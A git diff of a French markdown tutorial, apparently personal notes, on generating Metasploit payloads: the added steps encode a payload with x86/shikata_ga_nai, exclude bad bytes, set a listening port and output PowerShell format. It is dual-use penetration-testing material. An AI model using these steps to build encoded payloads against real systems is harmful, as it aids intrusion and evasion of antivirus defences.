@@ -145,9 +145,30 @@ generate -h
 ````bash
 generate -b \x00\xff
 ````
-## puis on va encoder le playload :
+## puis on va choisir l encoder le playload :
 
 ````bash
 generate -h
 show encoders
+````
+## endons en shikataganai !:
+
+````bash
+generate -e x86/shikata_ga_nai
+````
+
+## ajouton l option binaire :
+
+````bash
+generate -e x86/shikata_ga_nai -b \xff
+````
+## choisir son port :
+
+````bash
+generate -e x86/shikata_ga_nai -b \xff -o lport=6000
+````
+## format powershell :
+
+````bash
+generate -e x86/shikata_ga_nai -b \xff -f powershell
 ````
